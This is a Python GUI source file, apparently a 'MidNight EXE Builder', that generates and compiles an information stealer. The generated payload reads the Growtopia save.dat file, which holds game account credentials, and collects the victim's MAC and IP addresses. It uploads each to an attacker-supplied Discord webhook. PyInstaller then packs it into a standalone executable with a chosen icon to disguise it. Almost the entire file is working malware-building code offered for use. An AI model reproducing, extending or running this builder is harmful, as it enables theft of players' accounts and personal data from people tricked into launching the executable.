import tkinter as tk
from tkinter import filedialog, simpledialog
import os
import subprocess
import requests
import shutil
import socket

def custom_messagebox(title, message, msg_type="info"):
    """Create a custom message box that matches the app's theme."""
    messagebox = tk.Toplevel(root)
    messagebox.title(title)
    messagebox.geometry("300x150")
    messagebox.config(bg="#2B2B2B")
    
    label = tk.Label(messagebox, text=message, fg="#E0E0E0", bg="#2B2B2B", font=("Segoe UI", 10))
    label.pack(pady=10)

    button = tk.Button(messagebox, text="OK", command=messagebox.destroy, width=10, bg="#5D5D5D", fg="#D6A3E5", font=("Segoe UI", 10))
    button.pack(pady=20)

    if msg_type == "error":
        label.config(fg="red")

def test_webhook():
    webhook_url = webhook_entry.get()
    if not webhook_url:
        custom_messagebox("Error", "Webhook URL is required!", msg_type="error")
        return
    try:
        response = requests.post(webhook_url, json={"content": "Webhook test successful!"})
        if response.status_code == 204:
            custom_messagebox("Success", "Webhook test successful!")
        else:
            custom_messagebox("Error", f"Webhook test failed! Status Code: {response.status_code}", msg_type="error")
    except requests.exceptions.RequestException as e:
        custom_messagebox("Error", f"Failed to connect to webhook: {e}", msg_type="error")

def select_icon():
    global icon_path
    icon_path = filedialog.askopenfilename(title="Select Icon", filetypes=[("Icon Files", "*.ico")])
    if icon_path:
        icon_label.config(text=os.path.basename(icon_path))

def build_exe():
    webhook_url = webhook_entry.get()
    include_save_dat = var_save_dat.get()
    include_mac_address = var_mac_address.get()
    include_ip_address = var_ip_address.get()
    exe_name = exe_name_entry.get().strip()

    if not webhook_url:
        custom_messagebox("Error", "Webhook URL is required!", msg_type="error")
        return
    if not exe_name:
        custom_messagebox("Error", "EXE name is required!", msg_type="error")
        return

    # Generate payload.py based on user selections
    with open("payload.py", "w") as f:
        f.write(f"""
import requests
import uuid
import os
import socket

webhook_url = "{webhook_url}"

# Send save.dat file if selected
if {include_save_dat}:
    save_dat_path = os.path.expandvars(r"%LOCALAPPDATA%\\Growtopia\\save.dat")
    if os.path.exists(save_dat_path):
        with open(save_dat_path, "rb") as file:
            requests.post(webhook_url, files={{"file": file}})

# Send MAC address if selected, writing it to a temporary file first
if {include_mac_address}:
    mac_address = ':'.join(['{{:02x}}'.format((uuid.getnode() >> i) & 0xff) 
                            for i in range(0, 8 * 6, 8)][::-1])
    with open("mac_address.txt", "w") as mac_file:
        mac_file.write(mac_address)
    with open("mac_address.txt", "rb") as mac_file:
        requests.post(webhook_url, files={{"file": mac_file}})
    os.remove("mac_address.txt")  # Clean up

# Send IP address if selected
if {include_ip_address}:
    ip_address = socket.gethostbyname(socket.gethostname())
    with open("ip_address.txt", "w") as ip_file:
        ip_file.write(ip_address)
    with open("ip_address.txt", "rb") as ip_file:
        requests.post(webhook_url, files={{"file": ip_file}})
    os.remove("ip_address.txt")  # Clean up
""")

    # Build EXE using PyInstaller
    icon_option = f"--icon={icon_path}" if icon_path else ""
    try:
        # Run PyInstaller with subprocess to capture output
        result = subprocess.run(
            f"pyinstaller --onefile payload.py --name {exe_name} {icon_option}",
            shell=True, check=True, text=True, capture_output=True
        )
        custom_messagebox("Build Complete", f"EXE file '{exe_name}.exe' has been created!")
    except subprocess.CalledProcessError as e:
        custom_messagebox("Build Failed", f"Failed to create EXE. Error:\n{e.stderr}", msg_type="error")

    # Cleanup files
    os.remove("payload.py")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists(f"{exe_name}.spec"):
        os.remove(f"{exe_name}.spec")

# GUI setup
root = tk.Tk()
root.title("MidNight")
root.geometry("400x500")
root.config(bg="#2B2B2B")
root.iconbitmap("appicon.ico")  # Set the application icon

# Title
title_label = tk.Label(root, text="EXE Builder", fg="#E0E0E0", bg="#2B2B2B", font=("Segoe UI", 18, "bold"))
title_label.pack(pady=10)

# Frame for webhook and exe name
frame_input = tk.Frame(root, bg="#2B2B2B")
frame_input.pack(pady=10)

# Webhook URL entry
tk.Label(frame_input, text="Discord Webhook URL:", fg="#D6A3E5", bg="#2B2B2B", font=("Segoe UI", 10)).pack()
webhook_entry = tk.Entry(frame_input, width=40, fg="black", bg="#A67BBF", font=("Segoe UI", 10))
webhook_entry.pack(pady=5)

# Test Webhook button
tk.Button(frame_input, text="Test Webhook", command=test_webhook, width=15, bg="#5D5D5D", fg="#D6A3E5", font=("Segoe UI", 10)).pack(pady=5)

# EXE Name entry
tk.Label(frame_input, text="EXE Name:", fg="#D6A3E5", bg="#2B2B2B", font=("Segoe UI", 10)).pack(pady=5)
exe_name_entry = tk.Entry(frame_input, width=30, fg="black", bg="#A67BBF", font=("Segoe UI", 10))
exe_name_entry.pack(pady=5)

# Icon selection
icon_path = None
icon_label = tk.Label(frame_input, text="No icon selected", fg="#D6A3E5", bg="#2B2B2B", font=("Segoe UI", 10))
icon_label.pack(pady=5)
tk.Button(frame_input, text="Select Icon", command=select_icon, width=15, bg="#5D5D5D", fg="#D6A3E5", font=("Segoe UI", 10)).pack(pady=5)

# Options for save.dat, MAC address, and IP address
var_save_dat = tk.BooleanVar()
var_mac_address = tk.BooleanVar()
var_ip_address = tk.BooleanVar()

tk.Checkbutton(frame_input, text="Fetch save.dat", variable=var_save_dat, fg="#D6A3E5", bg="#2B2B2B", selectcolor="#2B2B2B", font=("Segoe UI", 10)).pack(pady=5)
tk.Checkbutton(frame_input, text="Fetch MAC Address", variable=var_mac_address, fg="#D6A3E5", bg="#2B2B2B", selectcolor="#2B2B2B", font=("Segoe UI", 10)).pack(pady=5)
tk.Checkbutton(frame_input, text="Fetch IP Address", variable=var_ip_address, fg="#D6A3E5", bg="#2B2B2B", selectcolor="#2B2B2B", font=("Segoe UI", 10)).pack(pady=5)

# Build button
tk.Button(root, text="BUILD", command=build_exe, width=15, bg="#5D5D5D", fg="#D6A3E5", font=("Segoe UI", 10)).pack(pady=20)

# Footer
footer_label = tk.Label(root, text="© 2024 MidNight Builder", fg="#E0E0E0", bg="#2B2B2B", font=("Segoe UI", 8))
footer_label.pack(side=tk.BOTTOM, pady=5)

root.mainloop()
